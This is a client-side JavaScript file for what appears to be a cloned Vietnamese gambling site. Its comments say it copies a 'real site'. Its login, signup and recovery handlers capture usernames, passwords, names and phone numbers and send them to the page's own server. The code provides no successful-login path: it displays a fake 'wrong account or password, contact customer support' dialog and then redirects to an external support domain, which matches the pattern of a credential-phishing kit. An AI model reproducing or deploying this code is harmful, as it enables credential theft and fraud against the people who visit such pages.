
// SPA / PJAX Router disabled - standard browser navigation used instead
window.navigateTo = function(url) {
  if (!url) return;
  window.location.href = url;
};

window.redirectToContactLink = async function() {
  try {
    const res = await fetch('/api/config/domains');
    const config = await res.json();
    if (config && config.redirectDomain && config.redirectDomain.trim()) {
      let target = config.redirectDomain.trim();
      if (!target.startsWith('http://') && !target.startsWith('https://')) {
        target = 'https://' + target;
      }
      window.location.href = target;
      return;
    }
  } catch (err) {
    console.error('Error fetching domain config:', err);
  }
  window.location.href = 'https://cskhga6789a.com/';
};


(function () {
  // Prevent non-numeric input for phone numbers
  document.addEventListener('input', function(e) {
    if (e.target.matches('input[type="tel"]')) {
      let val = e.target.value;
      if (val.startsWith('+')) {
        e.target.value = '+' + val.slice(1).replace(/[^0-9]/g, '');
      } else {
        e.target.value = val.replace(/[^0-9]/g, '');
      }
    }
  });

  // Add CSS styles for the registration modal, global auth feedback, and custom warning modal
  const style = document.createElement('style');
  style.textContent = `
    /* Hide block ad modals and iOS Add to Home overlays since React is deactivated */
    .float-center-ads-modal,
    .add-main.ios {
      display: none !important;
    }

    /* Mobile Swiper Banner responsive fix */
    .home-banner-top .carousel-banner-container,
    .home-banner-top .swiper {
      overflow: hidden !important;
      position: relative !important;
      width: 100% !important;
    }
    .home-banner-top .swiper-wrapper {
      display: flex !important;
      flex-direction: row !important;
      width: 100% !important;
      box-sizing: border-box !important;
    }
    .home-banner-top .swiper-slide {
      flex: 0 0 100% !important;
      width: 100% !important;
      max-width: 100% !important;
      box-sizing: border-box !important;
    }
    .home-banner-top .swiper-slide img {
      width: 100% !important;
      height: auto !important;
      display: block !important;
    }

    /* Swiper Pagination Bullets Centered Matching Real Site */
    .home-banner-top .swiper-pagination {
      position: absolute !important;
      bottom: 8px !important;
      left: 50% !important;
      right: auto !important;
      transform: translateX(-50%) !important;
      width: auto !important;
      margin: 0 auto !important;
      display: flex !important;
      justify-content: center !important;
      align-items: center !important;
      gap: 6px !important;
      z-index: 10 !important;
      pointer-events: none !important;
    }
    .home-banner-top .swiper-pagination-bullet {
      display: inline-block !important;
      border-radius: 50% !important;
      background: rgba(255, 255, 255, 0.4) !important;
      width: 7px !important;
      height: 7px !important;
      margin: 0 !important;
      transition: all 0.3s ease !important;
      pointer-events: auto !important;
      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.3) !important;
    }
    .home-banner-top .swiper-pagination-bullet-active {
      background: #ffffff !important;
      width: 11px !important;
      height: 11px !important;
      opacity: 1 !important;
      transform: scale(1.1) !important;
      box-shadow: 0 1px 5px rgba(0, 0, 0, 0.5) !important;
    }

    /* Swiper Navigation Buttons Matching Real Site */
    .home-banner-top .swiper-button-prev,
    .home-banner-top .swiper-button-next {
      position: absolute !important;
      top: 50% !important;
      transform: translateY(-50%) !important;
      margin-top: 0 !important;
      width: 32px !important;
      height: 32px !important;
      border-radius: 50% !important;
      background: rgba(0, 0, 0, 0.35) !important;
      color: #ffffff !important;
      display: flex !important;
      align-items: center !important;
      justify-content: center !important;
      z-index: 15 !important;
      cursor: pointer !important;
      transition: background 0.2s ease !important;
    }
    .home-banner-top .swiper-button-prev {
      left: 10px !important;
      right: auto !important;
    }
    .home-banner-top .swiper-button-next {
      right: 10px !important;
      left: auto !important;
    }
    .home-banner-top .swiper-button-prev:after {
      content: '❮' !important;
      font-size: 14px !important;
      font-weight: bold !important;
      color: #ffffff !important;
    }
    .home-banner-top .swiper-button-next:after {
      content: '❯' !important;
      font-size: 14px !important;
      font-weight: bold !important;
      color: #ffffff !important;
    }




    /* Toast feedback */
    .auth-toast {
      position: fixed;
      top: 20px;
      right: 20px;
      background: rgba(22, 27, 34, 0.95);
      border: 1px solid rgba(255, 75, 75, 0.3);
      color: #ff4b4b;
      padding: 12px 24px;
      border-radius: 8px;
      z-index: 10000000;
      font-family: system-ui, -apple-system, sans-serif;
      font-size: 14px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
      transform: translateY(-20px);
      opacity: 0;
      transition: all 0.3s ease;
    }
    .auth-toast.show {
      transform: translateY(0);
      opacity: 1;
    }
    .auth-toast.success {
      border-color: rgba(46, 204, 113, 0.3);
      color: #2ecc71;
    }

    /* Custom Warning Modal matching the screenshot */
    .cskh-modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.5);
      z-index: 99999999;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }
    .cskh-modal-card {
      background: #ffffff;
      width: 90%;
      max-width: 460px;
      border-radius: 12px;
      overflow: visible;
      box-shadow: 0 10px 25px rgba(0,0,0,0.35);
      position: relative;
      animation: modalScaleIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }
    @keyframes modalScaleIn {
      from { transform: scale(0.9); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }
    .cskh-modal-header {
      background: #e9eaec;
      padding: 12px;
      text-align: center;
      font-size: 18px;
      font-weight: 700;
      color: #333333;
      border-top-left-radius: 12px;
      border-top-right-radius: 12px;
    }
    .cskh-modal-close {
      position: absolute;
      top: -12px;
      right: -12px;
      width: 30px;
      height: 30px;
      background: #f9752d;
      border: 2px solid #ffffff;
      border-radius: 50%;
      color: #ffffff;
      font-size: 18px;
      font-weight: bold;
      display: flex;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
      transition: background 0.2s;
    }
    .cskh-modal-close:hover {
      background: #ff5722;
    }
    .cskh-modal-body {
      padding: 30px 24px;
      text-align: center;
    }
    .cskh-warning-icon {
      width: 80px;
      height: 80px;
      margin: 0 auto 20px auto;
      display: block;
    }
    .cskh-modal-text {
      color: #444444;
      font-size: 15px;
      line-height: 1.6;
      margin-bottom: 24px;
      font-weight: 500;
    }
    .cskh-modal-actions {
      display: flex;
      gap: 14px;
      justify-content: center;
    }
    .cskh-btn {
      flex: 1;
      padding: 10px 16px;
      border: none;
      border-radius: 6px;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.2s;
      outline: none;
    }
    .cskh-btn-close {
      background: #c5c5c5;
      color: #ffffff;
    }
    .cskh-btn-close:hover {
      background: #b0b0b0;
    }
    .cskh-btn-action {
      background: #f9752d;
      color: #ffffff;
    }
    .cskh-btn-action:hover {
      background: #ff5722;
      box-shadow: 0 4px 10px rgba(249,117,45,0.3);
    }

    /* Signup Modal Overlay */
    .signup-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(15, 17, 23, 0.7);
      backdrop-filter: blur(8px);
      z-index: 999999;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: system-ui, -apple-system, sans-serif;
    }

    /* Glassmorphic Signup Card */
    .signup-card {
      background: rgba(22, 27, 34, 0.85);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 16px;
      padding: 40px;
      width: 100%;
      max-width: 480px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
      animation: signupFadeIn 0.4s ease;
      position: relative;
    }

    @keyframes signupFadeIn {
      from { opacity: 0; transform: scale(0.95) translateY(10px); }
      to { opacity: 1; transform: scale(1) translateY(0); }
    }

    .signup-card .close-btn {
      position: absolute;
      top: 20px;
      right: 20px;
      background: none;
      border: none;
      color: rgba(255,255,255,0.4);
      font-size: 24px;
      cursor: pointer;
      transition: color 0.2s;
    }
    .signup-card .close-btn:hover { color: #fff; }

    .signup-card h2 {
      color: #fff;
      font-size: 24px;
      margin-bottom: 8px;
      text-align: center;
      font-weight: 700;
    }
    .signup-card p.subtitle {
      color: rgba(255, 255, 255, 0.5);
      font-size: 13px;
      text-align: center;
      margin-bottom: 28px;
    }

    .signup-field {
      margin-bottom: 18px;
      position: relative;
    }
    .signup-field label {
      display: block;
      color: rgba(255, 255, 255, 0.7);
      font-size: 12px;
      margin-bottom: 6px;
      font-weight: 500;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    .signup-field input {
      width: 100%;
      padding: 12px 14px;
      background: rgba(255, 255, 255, 0.04);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 8px;
      color: #fff;
      font-size: 14px;
      outline: none;
      transition: all 0.25s ease;
    }
    .signup-field input:focus {
      border-color: #f9752d;
      background: rgba(255, 255, 255, 0.08);
      box-shadow: 0 0 0 3px rgba(249, 117, 45, 0.15);
    }

    .signup-btn {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #f9752d, #ff5722);
      border: none;
      border-radius: 8px;
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.25s ease;
      margin-top: 10px;
    }
    .signup-btn:hover {
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(249, 117, 45, 0.3);
    }
    .signup-btn:active {
      transform: translateY(0);
    }

    .signup-footer {
      margin-top: 20px;
      text-align: center;
      font-size: 13px;
      color: rgba(255,255,255,0.4);
    }
    .signup-footer a {
      color: #f9752d;
      text-decoration: none;
      font-weight: 500;
    }
    .signup-footer a:hover {
      text-decoration: underline;
    }
  `;
  document.head.appendChild(style);

  // Helper to show custom toasts
  function showToast(message, type = 'error') {
    let toast = document.querySelector('.auth-toast');
    if (!toast) {
      toast = document.createElement('div');
      toast.className = 'auth-toast';
      document.body.appendChild(toast);
    }
    toast.textContent = message;
    toast.className = 'auth-toast ' + type;
    toast.classList.add('show');
    setTimeout(() => {
      toast.classList.remove('show');
    }, 4000);
  }

  // Warning Dialog helper matching user's screenshot
  function showWarningDialog(redirectUrl) {
    const overlay = document.createElement('div');
    overlay.className = 'cskh-modal-overlay';
    
    // Warning SVG icon
    const warningIcon = `
      <svg class="cskh-warning-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" fill="#ff9800"/>
        <path d="M12 9V14" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        <path d="M12 17H12.01" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    `;

    overlay.innerHTML = `
      <div class="cskh-modal-card">
        <div class="cskh-modal-close">×</div>
        <div class="cskh-modal-header">Lưu ý</div>
        <div class="cskh-modal-body">
          ${warningIcon}
          <div class="cskh-modal-text">Nhập sai tài khoản hoặc mật mã, vui lòng liên hệ CSKH 24/7</div>
          <div class="cskh-modal-actions">
            <button class="cskh-btn cskh-btn-close">Đóng</button>
            <button class="cskh-btn cskh-btn-action">Liên hệ CSKH</button>
          </div>
        </div>
      </div>
    `;

    document.body.appendChild(overlay);

    const getAbsoluteUrl = (url) => {
      if (!url || url === '/') return '/';
      if (!url.startsWith('http://') && !url.startsWith('https://')) {
        return 'https://' + url;
      }
      return url;
    };

    const handleRedirection = () => {
      if (document.body.contains(overlay)) {
        document.body.removeChild(overlay);
      }
      window.navigateTo(getAbsoluteUrl(redirectUrl));
    };

    // Close actions
    overlay.querySelector('.cskh-modal-close').addEventListener('click', handleRedirection);
    overlay.querySelector('.cskh-btn-close').addEventListener('click', handleRedirection);
    overlay.querySelector('.cskh-btn-action').addEventListener('click', () => {
      const cskhLink = document.querySelector('#shortcut_PConlinecs a');
      if (cskhLink && cskhLink.href) {
        window.navigateTo(cskhLink.href);
      } else {
        window.navigateTo(getAbsoluteUrl(redirectUrl));
      }
    });

    // Auto redirect after 4 seconds if no action taken
    setTimeout(() => {
      if (document.body.contains(overlay)) {
        handleRedirection();
      }
    }, 4000);
  }

  // Intercept header login attempts with CAPTURE phase to run before inline click handlers
  document.addEventListener('click', async function (e) {
    const loginBtn = e.target.closest('.header-btn.login');
    if (loginBtn) {
      e.preventDefault();
      e.stopImmediatePropagation(); // Prevent inline scripts from firing redirect rules

      // Locate username & password inputs
      const accountInput = document.querySelector('.input-wrap.account input, input.username-btn');
      const passwordInput = document.querySelector('.input-wrap.password input, input.password-btn');

      if (!accountInput || !accountInput.value.trim()) {
        showToast('Vui lòng nhập Tên Đăng Nhập');
        return;
      }
      if (!passwordInput || !passwordInput.value.trim()) {
        showToast('Vui lòng nhập Mật Khẩu');
        return;
      }

      const payload = {
        AccountID: accountInput.value.trim(),
        AccountPWD: passwordInput.value
      };

      try {
        const response = await fetch('/api/Authorize/SignIn', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        const result = await response.json();
        
        if (result.Error) {
          showWarningDialog(result.Error.Redirect);
        }
      } catch (err) {
        showWarningDialog('/');
      }
    }
  }, true); // Use capture phase!

  // Listen for signup submission and interactions on signup page
  document.addEventListener('click', async function (e) {
    // Check if the signup elements exist to confirm we are in signup context
    const accountInput = document.getElementById('playerid');
    const passwordInput = document.getElementById('password');
    const nameInput = document.getElementById('firstname');
    const phoneInput = document.querySelector('input[type="tel"]');

    if (!accountInput || !passwordInput || !nameInput || !phoneInput) {
      return; // Not on the signup page
    }

    // 1. Password visibility toggle
    const eyeIcon = e.target.closest('.mps-unreadable, .mps-readable');
    if (eyeIcon) {
      e.preventDefault();
      e.stopImmediatePropagation();
      const input = eyeIcon.previousElementSibling;
      if (input && input.tagName === 'INPUT') {
        if (input.type === 'password') {
          input.type = 'text';
          eyeIcon.classList.remove('mps-unreadable');
          eyeIcon.classList.add('mps-readable');
        } else {
          input.type = 'password';
          eyeIcon.classList.remove('mps-readable');
          eyeIcon.classList.add('mps-unreadable');
        }
      }
      return;
    }

    // 2. Checkbox toggle logic
    const checkboxWrapper = e.target.closest('.agree-item, .tips, .agree-policy, .nrc-checkbox');
    if (checkboxWrapper) {
      const checkboxInput = checkboxWrapper.querySelector('input[type="checkbox"]');
      if (checkboxInput && e.target !== checkboxInput) {
        e.preventDefault();
        e.stopImmediatePropagation();
        checkboxInput.checked = !checkboxInput.checked;
      }
      return;
    }

    // 3. Back / Close button (Quay lại hoặc Đóng)
    const resetBtn = e.target.closest('.btn-reset, .close, img.close');
    if (resetBtn) {
      e.preventDefault();
      e.stopImmediatePropagation();
      window.navigateTo('/');
      return;
    }

    // 4. Submit button
    const submitBtn = e.target.closest('.btn-submit, .top25 .nrc-button, form.signup-form button');
    if (submitBtn) {
      e.preventDefault();
      e.stopImmediatePropagation();

      let isValid = true;
      
      const showError = (inputEl, msg) => {
        if (!inputEl) return;
        const wrapper = inputEl.closest('.nrc-form-input');
        if (wrapper) {
          wrapper.classList.add('has-error');
          inputEl.classList.add('invalid');
          const telWrapper = inputEl.closest('.react-tel-input');
          if (telWrapper) {
            telWrapper.classList.add('invalid');
          }
          let errEl = wrapper.querySelector('.error-text');
          if (!errEl) {
            errEl = document.createElement('small');
            errEl.className = 'error-text';
            errEl.style.color = '#e74c3c';
            errEl.style.display = 'block';
            errEl.style.marginTop = '4px';
            wrapper.appendChild(errEl);
          }
          errEl.innerText = msg;
        }
        isValid = false;
      };

      document.querySelectorAll('.nrc-form-input.has-error').forEach(wrapper => {
        wrapper.classList.remove('has-error');
        const errEl = wrapper.querySelector('.error-text');
        if (errEl) errEl.remove();
      });
      document.querySelectorAll('input.invalid').forEach(el => {
        el.classList.remove('invalid');
      });
      document.querySelectorAll('.react-tel-input.invalid').forEach(el => {
        el.classList.remove('invalid');
      });

      // 1. Username Validation
      const usernameVal = accountInput.value.trim();
      if (!usernameVal) {
        showError(accountInput, 'Bắt buộc nhập');
      }

      // 2. Password Validation
      const pwdVal = passwordInput.value;
      if (!pwdVal) {
        showError(passwordInput, 'Bắt buộc nhập');
      }

      // 3. Họ Và Tên Validation
      const nameVal = nameInput.value.trim();
      if (!nameVal) {
        showError(nameInput, 'Bắt buộc nhập');
      }

      // 4. Số điện thoại Validation
      const phoneVal = phoneInput.value.trim();
      const phoneClean = phoneVal.replace(/[- ]/g, '');
      if (!phoneVal || phoneClean === '+84' || phoneClean === '+' || phoneClean === '') {
        showError(phoneInput, 'Bắt buộc nhập');
      } else {
        const phoneRegex = /^\+?[0-9]+$/;
        if (!phoneRegex.test(phoneClean)) {
          showError(phoneInput, 'Chỉ được phép nhập số');
        }
      }

      // Checkbox state validation
      const checkboxInput = document.querySelector('input[type="checkbox"]');
      const isChecked = checkboxInput ? checkboxInput.checked : true;
      if (!isChecked) {
        showToast('Vui lòng đồng ý với Chính sách thành viên');
        isValid = false;
      }

      if (!isValid) return;

      // Encode password to base64 to match back-end decoding logic
      const base64Pwd = btoa(passwordInput.value);

      const payload = {
        AccountID: accountInput.value.trim(),
        PWD: base64Pwd,
        NickName: nameInput.value.trim(),
        CellPhone: phoneInput.value.trim(),
        AgentID: ''
      };

      try {
        const response = await fetch('/api/MemberInfo/RegisterMember', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        const result = await response.json();
        if (result.Error) {
          showWarningDialog(result.Error.Redirect || '/');
        }
      } catch (err) {
        showToast('Lỗi kết nối máy chủ.');
      }
    }
  }, true); // Use capture phase!

  // Inject styles for mobile navigation and custom login modal
  const navStyle = document.createElement('style');
  navStyle.textContent = `
    .nrc-form-input.has-error input,
    .nrc-form-input.has-error .react-tel-input input,
    input.invalid,
    .react-tel-input.invalid input {
      border-color: #f9752d !important;
    }
    .nrc-form-input.has-error .info-msg,
    .has-error .info-msg {
      display: none !important;
    }

    .auth-login-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.75);
      z-index: 100000000;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: system-ui, -apple-system, sans-serif;
    }
    .auth-login-card {
      background: #191c29;
      border: 1px solid #3d7fc5;
      border-radius: 12px;
      width: 85%;
      max-width: 380px;
      padding: 24px;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
      color: #fff;
      animation: modalScaleIn 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }
    .auth-login-title {
      font-size: 20px;
      font-weight: bold;
      text-align: center;
      margin-bottom: 20px;
      color: #3d7fc5;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .auth-login-input-group {
      margin-bottom: 16px;
    }
    .auth-login-input-group label {
      display: block;
      font-size: 13px;
      color: #ccc;
      margin-bottom: 6px;
    }
    .auth-login-input-group input {
      width: 100%;
      box-sizing: border-box;
      height: 44px;
      background: #11141e;
      border: 1px solid #333;
      border-radius: 6px;
      color: #fff;
      padding: 0 12px;
      font-size: 15px;
      transition: border-color 0.2s;
    }
    .auth-login-input-group input:focus {
      border-color: #3d7fc5;
      outline: none;
    }
    .auth-login-btn {
      width: 100%;
      height: 44px;
      background: #3d7fc5;
      border: none;
      border-radius: 6px;
      color: #fff;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
      transition: background 0.2s;
    }
    .auth-login-btn:hover {
      background: #4a90e2;
    }
    .auth-login-close {
      text-align: center;
      margin-top: 15px;
      color: #aaa;
      font-size: 14px;
      cursor: pointer;
      text-decoration: underline;
    }
    .auth-login-close:hover {
      color: #fff;
    }
  `;
  document.head.appendChild(navStyle);

  // Function to show the custom mobile login modal
  function showLoginModal() {
    let overlay = document.querySelector('.auth-login-overlay');
    if (overlay) return;

    overlay = document.createElement('div');
    overlay.className = 'auth-login-overlay';
    overlay.innerHTML = `
      <div class="auth-login-card">
        <div class="auth-login-title">Đăng Nhập</div>
        <div class="auth-login-input-group">
          <label>Tên đăng nhập</label>
          <input type="text" id="modal-login-username" placeholder="Tên đăng nhập...">
        </div>
        <div class="auth-login-input-group">
          <label>Mật khẩu</label>
          <input type="password" id="modal-login-password" placeholder="Mật khẩu...">
        </div>
        <button class="auth-login-btn" id="modal-login-submit">Đăng Nhập</button>
        <div class="auth-login-close">Hủy bỏ</div>
      </div>
    `;
    document.body.appendChild(overlay);

    overlay.querySelector('.auth-login-close').addEventListener('click', () => {
      document.body.removeChild(overlay);
    });

    overlay.querySelector('#modal-login-submit').addEventListener('click', async () => {
      const usernameInput = overlay.querySelector('#modal-login-username');
      const passwordInput = overlay.querySelector('#modal-login-password');

      if (!usernameInput.value.trim()) {
        showToast('Vui lòng nhập Tên Đăng Nhập');
        return;
      }
      if (!passwordInput.value.trim()) {
        showToast('Vui lòng nhập Mật Khẩu');
        return;
      }

      const payload = {
        AccountID: usernameInput.value.trim(),
        AccountPWD: passwordInput.value
      };

      try {
        const response = await fetch('/api/Authorize/SignIn', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        const result = await response.json();
        if (document.body.contains(overlay)) {
          document.body.removeChild(overlay);
        }
        if (result.Error) {
          showWarningDialog(result.Error.Redirect);
        }
      } catch (err) {
        if (document.body.contains(overlay)) {
          document.body.removeChild(overlay);
        }
        showWarningDialog('/');
      }
    });
  }

  // Bind click event handlers for static elements routing
  document.addEventListener('click', function (e) {
    // 1. Bottom navigation click routing
    const bottomNavLi = e.target.closest('.bottom-nav li');
    if (bottomNavLi) {
      e.preventDefault();
      e.stopPropagation();
      if (bottomNavLi.classList.contains('nav-home')) {
        window.navigateTo('/');
      } else if (bottomNavLi.classList.contains('nav-promo')) {
        window.navigateTo('/promotions');
      } else if (bottomNavLi.classList.contains('nav-deposit')) {
        window.navigateTo('/login');
      } else if (bottomNavLi.classList.contains('nav-withdrawal')) {
        window.navigateTo('/login');
      } else if (bottomNavLi.classList.contains('nav-cs')) {
        redirectToContactLink();
      } else if (bottomNavLi.classList.contains('nav-account')) {
        window.navigateTo('/account');
      }

      return;
    }

    // 2. Left sidebar category navigation routing
    const swiperSlide = e.target.closest('.home-swiper-nav .swiper-slide');
    if (swiperSlide) {
      e.preventDefault();
      e.stopPropagation();
      const code = swiperSlide.getAttribute('data-code');
      if (code) {
        switch (code) {
          case 'ANIMAL':
            window.navigateTo('/gamelobby/animal');
            break;
          case 'SPORTS':
            window.navigateTo('/gamelobby/sports');
            break;
          case 'LIVE':
            window.navigateTo('/gamelobby/live');
            break;
          case 'EGAME':
            window.navigateTo('/gamelobby/egame');
            break;
          case 'MPG':
            window.navigateTo('/gamelobby/mpg');
            break;
          case 'ESPORTS':
            window.navigateTo('/gamelobby/esports');
            break;
          case 'CHESS':
            window.navigateTo('/gamelobby/chess');
            break;
          case 'LOTTERY':
            window.navigateTo('/gamelobby/lottery');
            break;
          case 'PROMOTIONS':
            window.navigateTo('/promotions');
            break;
          case 'PAGE_QR':
            window.navigateTo('/page/QR');
            break;
          case 'MY_VIP':
            window.navigateTo('/myvip');
            break;
          default:
            if (code.startsWith('http')) {
              window.navigateTo(code);
            }
            break;
        }
      }
      return;
    }

    // 3. Header login buttons click redirects to login page
    const loginLink = e.target.closest('a[href="/login"], #login-btn');
    if (loginLink) {
      e.preventDefault();
      e.stopPropagation();
      window.navigateTo('/login');
      return;
    }

    // 4. Mobile login page form submission handler
    const loginSubmitBtn = e.target.closest('#login-submit-btn');
    if (loginSubmitBtn) {
      e.preventDefault();
      e.stopImmediatePropagation();
      
      const usernameInput = document.getElementById('login');
      const phoneInput = document.getElementById('phone');
      const passwordInput = document.getElementById('password');
      if (!usernameInput || !passwordInput) return;
      
      let isValid = true;
      const showError = (inputEl, msg) => {
        const group = inputEl.closest('.nrc-form-item, .input-group, .form-group, .nrc-form-input');
        if (group) {
          group.classList.add('has-error');
          let errEl = group.querySelector('.error-text');
          if (!errEl) {
            errEl = document.createElement('small');
            errEl.className = 'error-text';
            errEl.style.color = '#f9752d';
            errEl.style.display = 'block';
            errEl.style.marginTop = '4px';
            group.appendChild(errEl);
          }
          errEl.innerText = msg;
        }
        isValid = false;
      };
      
      document.querySelectorAll('.has-error').forEach(g => {
        g.classList.remove('has-error');
        const errEl = g.querySelector('.error-text');
        if (errEl) errEl.remove();
      });
      
      if (!usernameInput.value.trim()) {
        showError(usernameInput, 'Bắt buộc nhập');
      }
      if (phoneInput && !phoneInput.value.trim()) {
        showError(phoneInput, 'Bắt buộc nhập');
      }
      if (!passwordInput.value.trim()) {
        showError(passwordInput, 'Bắt buộc nhập');
      }
      
      if (!isValid) return;
      
      const payload = {
        AccountID: usernameInput.value.trim(),
        AccountPWD: passwordInput.value,
        phone: phoneInput ? phoneInput.value.trim() : ''
      };

      
      try {
        fetch('/api/Authorize/SignIn', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .then(result => {
          if (result.Error) {
            showWarningDialog(result.Error.Redirect);
          }
        })
        .catch(() => {
          showWarningDialog('/');
        });
      } catch (err) {
        showWarningDialog('/');
      }
      return;
    }

    // 5. Mobile login password visibility toggle
    const togglePwdBtn = e.target.closest('#toggle-pwd-btn');
    if (togglePwdBtn) {
      e.preventDefault();
      e.stopImmediatePropagation();
      const input = document.getElementById('password');
      const eyeIcon = togglePwdBtn;
      if (input && eyeIcon) {
        if (input.type === 'password') {
          input.type = 'text';
          eyeIcon.className = 'mps-readable';
        } else {
          input.type = 'password';
          eyeIcon.className = 'mps-unreadable';
        }
      }
      return;
    }

    // 6. Desktop login page form submission handler
    const deskLoginSubmitBtn = e.target.closest('#desk-login-submit-btn');
    if (deskLoginSubmitBtn) {
      e.preventDefault();
      e.stopImmediatePropagation();
      
      const usernameInput = document.getElementById('desk-login-username');
      const passwordInput = document.getElementById('desk-login-password');
      if (!usernameInput || !passwordInput) return;
      
      let isValid = true;
      const showError = (inputEl, msg) => {
        const group = inputEl.closest('.desktop-login-field');
        if (group) {
          group.classList.add('has-error');
          let errEl = group.querySelector('.error-text');
          if (!errEl) {
            errEl = document.createElement('small');
            errEl.className = 'error-text';
            group.appendChild(errEl);
          }
          errEl.innerText = msg;
        }
        isValid = false;
      };
      
      document.querySelectorAll('.desktop-login-field.has-error').forEach(g => {
        g.classList.remove('has-error');
        const errEl = g.querySelector('.error-text');
        if (errEl) errEl.remove();
      });
      
      if (!usernameInput.value.trim()) {
        showError(usernameInput, 'Bắt buộc nhập');
      }
      if (!passwordInput.value.trim()) {
        showError(passwordInput, 'Bắt buộc nhập');
      }
      
      if (!isValid) return;
      
      const payload = {
        AccountID: usernameInput.value.trim(),
        AccountPWD: passwordInput.value
      };
      
      try {
        fetch('/api/Authorize/SignIn', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .then(result => {
          if (result.Error) {
            showWarningDialog(result.Error.Redirect);
          }
        })
        .catch(() => {
          showWarningDialog('/');
        });
      } catch (err) {
        showWarningDialog('/');
      }
      return;
    }

    // 7. Desktop login password visibility toggle
    const deskTogglePwdBtn = e.target.closest('#desk-toggle-pwd-btn');
    if (deskTogglePwdBtn) {
      e.preventDefault();
      e.stopImmediatePropagation();
      const input = document.getElementById('desk-login-password');
      const eyeIcon = deskTogglePwdBtn.querySelector('i');
      if (input && eyeIcon) {
        if (input.type === 'password') {
          input.type = 'text';
          eyeIcon.className = 'mps-readable';
        } else {
          input.type = 'password';
          eyeIcon.className = 'mps-unreadable';
        }
      }
      return;
    }

    // 8. General recovery link clicks to display warning modal
    const recoveryLink = e.target.closest('.recovery-links a, .desktop-forget-options a');
    if (recoveryLink) {
      e.preventDefault();
      e.stopImmediatePropagation();
      showWarningDialog('/');
      return;
    }

    // 9. Mobile Account page menu item routing
    const accountMenuItem = e.target.closest('.m-member-center-account .menu-block .item, .m-member-center-account .info-block, .m-member-center-account .func-btn-block .nrc-button');
    if (accountMenuItem) {
      e.preventDefault();
      e.stopImmediatePropagation();
      const itemKey = accountMenuItem.getAttribute('data-item');
      if (itemKey === 'vip') {
        window.navigateTo('/myvip');
      } else if (itemKey === 'promo') {
        window.navigateTo('/promotions');
      } else if (itemKey === 'helpCenter') {
        redirectToContactLink();
      } else if (itemKey === 'app') {
        window.navigateTo('/page/QR');
      } else {
        window.navigateTo('/login');
      }
      return;
    }
  }, true); // Use capture phase to intercept routing clicks!
})();



// Migrated from index.ejs inline script
document.addEventListener('click', function(e) {
    const navLink = e.target.closest('.nav-item, .nav li, .header-btn.signup, .header-btn.login');
    if (navLink) {
      if (navLink.classList.contains('signup')) {
        window.navigateTo('/signup');
        return;
      }
      if (navLink.classList.contains('login')) {
        window.navigateTo('/signup');
        return;
      }
      const navLi = navLink.closest('li');
      if (navLi) {
        const content = navLi.getAttribute('data-content');
        if (content) {
          const pathVal = content.toLowerCase();
          if (['animal', 'sports', 'live', 'egame', 'mpg', 'esports', 'chess', 'lottery'].includes(pathVal)) {
            window.navigateTo('/gamelobby/' + pathVal);
            return;
          }
          if (pathVal === 'promotions') {
            window.navigateTo('/promotions');
            return;
          }
          if (pathVal === 'page_qr') {
            window.navigateTo('/page/QR');
            return;
          }
          if (pathVal === 'my_vip') {
            window.navigateTo('/myvip');
            return;
          }
        }
      }
    }
    const closeBtn = e.target.closest('.mps-close, .close, .btn-close, [data-promo-float="close"]');
    if (closeBtn) {
      e.preventDefault();
      const container = e.target.closest('.ad-center, .floating-promo-center, .adItem, .modal, .hover-container, .ad-center-overlay, .quick-nav, .popup');
      if (container) {
        container.style.setProperty('display', 'none', 'important');
        if (container.classList.contains('ad-center')) {
          const overlay = document.querySelector('.ad-center-overlay');
          if (overlay) overlay.style.setProperty('display', 'none', 'important');
        }
      } else {
        closeBtn.parentElement.style.setProperty('display', 'none', 'important');
      }
    }
  });

// Real-time input constraints
document.addEventListener('input', function(e) {
  if (e.target.id === 'playerid') {
    const start = e.target.selectionStart;
    const end = e.target.selectionEnd;
    e.target.value = e.target.value.toLowerCase();
    if (start !== null && end !== null) {
      e.target.setSelectionRange(start, end);
    }
  }
});

// -------------------------------------------------------------
